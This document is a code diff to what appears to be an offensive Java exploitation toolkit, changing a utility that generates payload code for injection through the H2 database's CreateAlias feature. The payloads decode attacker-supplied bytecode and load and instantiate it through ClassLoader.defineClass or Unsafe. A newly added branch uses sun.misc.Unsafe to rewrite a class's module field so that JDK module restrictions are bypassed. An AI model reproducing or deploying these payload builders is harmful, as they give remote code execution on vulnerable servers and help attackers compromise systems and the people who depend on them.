@@ -1,5 +1,6 @@
 package cn.butler.thirdparty.payloads.custom;
 
+import cn.butler.payloads.ObjectPayload;
 import me.gv7.woodpecker.bcel.HackBCELs;
 import cn.butler.thirdparty.util.BASE64Decoder;
 import cn.butler.yso.payloads.util.CommonUtil;
@@ -162,14 +163,10 @@ public class CommandlUtil {
         } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS)) {
             String code = "";
             String parameter = command.substring(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS.length());
-            if(parameter.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_FILE)){
-                String codeFile = parameter.substring(CommandConstant.COMMAND_CLASS_FILE.length());
-                code = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(codeFile)));
-            } else if (parameter.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_BASE64)) {
-                code = parameter.substring(CommandConstant.COMMAND_CODE_BASE64.length());
-            }else {
-                throw new Exception(String.format("Command [%s] not supported",command));
-            } //这里不进行格式化输出,H2的CreateAlias不支持格式化
+            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
+            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);
+
+            //这里不进行格式化输出,H2的CreateAlias不支持格式化
             cmd = String.format("String string = \"%s\";" +
                 "Class base64;" +
                 "byte[] value = null;" +
@@ -200,14 +197,10 @@ public class CommandlUtil {
         } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_CLASSLOADER_DEFINECLASS)) {
             String code = "";
             String parameter = command.substring(CommandConstant.COMMAND_CLASSLOADER_DEFINECLASS.length());
-            if(parameter.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_FILE)){
-                String codeFile = parameter.substring(CommandConstant.COMMAND_CLASS_FILE.length());
-                code = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(codeFile)));
-            } else if (parameter.toLowerCase().startsWith(CommandConstant.COMMAND_CLASS_BASE64)) {
-                code = parameter.substring(CommandConstant.COMMAND_CODE_BASE64.length());
-            }else {
-                throw new Exception(String.format("Command [%s] not supported",command));
-            } //这里不进行格式化输出,H2的CreateAlias不支持格式化
+            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
+            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);
+
+            //这里不进行格式化输出,H2的CreateAlias不支持格式化
             cmd = String.format("ClassLoader classLoader = Thread.currentThread().getContextClassLoader();" +
                 "java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);" +
                 "defineClass.setAccessible(true);" +
@@ -224,6 +217,33 @@ public class CommandlUtil {
                 "}" +
                 "Class clazz = (Class)defineClass.invoke(classLoader,bytecode,0,bytecode.length);" +
                 "clazz.newInstance();",code);
+        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS)) {
+            String code = "";
+            String className = "";
+            String parameter = "";
+            String ready_command = command.substring(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS.length());
+            String[] split = ready_command.split("\\|", 2);
+            className = split[0];
+            parameter = split[1];
+            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parameter);
+            code = Base64.getEncoder().encodeToString((byte[]) objects[1]);
+
+             //这里不进行格式化输出,H2的CreateAlias不支持格式化
+            cmd = String.format("byte[] standBytes = null;" +
+                "String string = \"%s\";" +
+                "Class safe = java.lang.Class.forName(\"sun.misc.Unsafe\");" +
+                "java.lang.reflect.Field unsafeField = safe.getDeclaredField(\"theUnsafe\");" +
+                "unsafeField.setAccessible(true);" +
+                "sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
+                "java.lang.Module module = java.lang.Object.class.getModule();" +
+                "java.lang.Class cls = %s.class;" +
+                "long offset = unsafe.objectFieldOffset(java.lang.Class.class.getDeclaredField(\"module\"));" +
+                "unsafe.getAndSetObject(cls, offset, module);" +
+                "java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
+                "defineClass.setAccessible(true);" +
+                "byte[] bytecode = java.util.Base64.getDecoder().decode(string);" +
+                "java.lang.Class clazz = (java.lang.Class) defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
+                "clazz.newInstance();",code,className);
         } else {
             throw new Exception(String.format("Command [%s] not supported",command));
         }
